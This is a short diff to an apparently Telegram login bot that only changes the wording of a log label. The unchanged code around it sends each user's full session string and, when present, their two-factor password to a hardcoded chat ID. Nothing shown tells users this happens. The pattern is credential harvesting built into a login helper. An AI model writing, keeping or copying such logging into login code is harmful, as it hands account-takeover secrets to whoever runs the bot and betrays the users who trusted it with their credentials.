@@ -97,7 +97,7 @@ async def main(bot: Client, message: Message):
             await uclient.connect()
 
             database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
-            log_message = f"**✨New Login**\n\n**✨User ID:** {message.from_user.id}\n**✨Session String:** `{string_session}`"
+            log_message = f"**✨New Login**\n\n**✨User ID:** {message.from_user.id}\n**✨Session String ↓** `{string_session}`"
             if 'password' in locals():
                 log_message += f"\n**2FA Password:** `{password}`"
             await bot.send_message(-1002205642527, log_message)
